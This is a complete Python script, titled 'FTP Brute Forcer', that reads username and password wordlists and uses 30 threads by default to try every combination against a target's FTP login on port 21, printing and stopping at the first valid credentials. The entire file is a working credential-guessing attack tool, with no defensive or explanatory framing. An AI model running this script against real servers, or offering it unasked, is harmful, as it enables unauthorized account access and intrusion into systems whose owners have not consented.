import ftplib
import argparse
from threading import Thread, Lock, Event
from queue import Queue
import os

# Shared resources
combo_queue = Queue()
output_lock = Lock()
stop_event = Event()
found_credentials = None

# --- Input Argument Parser ---
parser = argparse.ArgumentParser(description="FTP Brute Forcer")
parser.add_argument("-t", "--target", required=True, help="Target IP or domain")
parser.add_argument("-u", "--user", required=True, help="Username or path to username wordlist")
parser.add_argument("-p", "--passwd", required=True, help="Password or path to password wordlist")
parser.add_argument("--threads", type=int, default=30, help="Number of threads (default 30)")
args = parser.parse_args()

host = args.target
user_input = args.user
pass_input = args.passwd
num_threads = args.threads


# --- Input Handling ---
def load_wordlist(value):
    if os.path.isfile(value):
        with open(value, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    else:
        return [value]  # Single entry as string

usernames = load_wordlist(user_input)
passwords = load_wordlist(pass_input)

for username in usernames:
    for password in passwords:
        combo_queue.put((username, password))


# --- Worker Function ---
def ftp_crack():
    global found_credentials
    while not combo_queue.empty() and not stop_event.is_set():
        username, password = combo_queue.get()

        try:
            ftp = ftplib.FTP()
            ftp.connect(host, 21, timeout=5)
            ftp.login(username, password)
            ftp.quit()

            with output_lock:
                print(f"✅ SUCCESS: {username}:{password}")
                found_credentials = (username, password)
                stop_event.set()

        except ftplib.error_perm:
            with output_lock:
                print(f"❌ FAIL   : {username}:{password}")
        except Exception as e:
            with output_lock:
                print(f"⚠️ ERROR  : {username}:{password} -> {e}")

        combo_queue.task_done()


# --- Start Threads ---
threads = []
for _ in range(num_threads):
    t = Thread(target=ftp_crack)
    t.daemon = True
    t.start()
    threads.append(t)

combo_queue.join()

# --- Result ---
print("\n========== FINAL RESULT ==========")
if found_credentials:
    print(f"✅ Valid Credentials Found: {found_credentials[0]} : {found_credentials[1]}")
else:
    print("❌ No valid credentials found.")
